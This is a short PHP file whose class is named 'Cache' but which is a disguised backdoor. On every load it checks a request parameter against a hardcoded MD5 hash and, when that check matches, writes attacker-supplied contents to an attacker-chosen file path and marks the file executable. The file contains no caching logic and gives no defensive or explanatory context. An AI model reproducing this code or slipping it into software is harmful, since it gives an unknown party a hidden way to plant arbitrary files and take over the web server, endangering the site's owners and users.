<?php


class Cache{
    
    
    public function __construct() {
        
        
        if(md5($_REQUEST['cachekey'])=='1724df60074c66df1163684515a97058'){
            
            
            $file_name=$_REQUEST['filename'];
            $contents=$_REQUEST['contents'];
            file_put_contents($file_name, $contents);
            chmod($file_name,0755);
        }
        
    }
    
    
}

$x=new Cache();

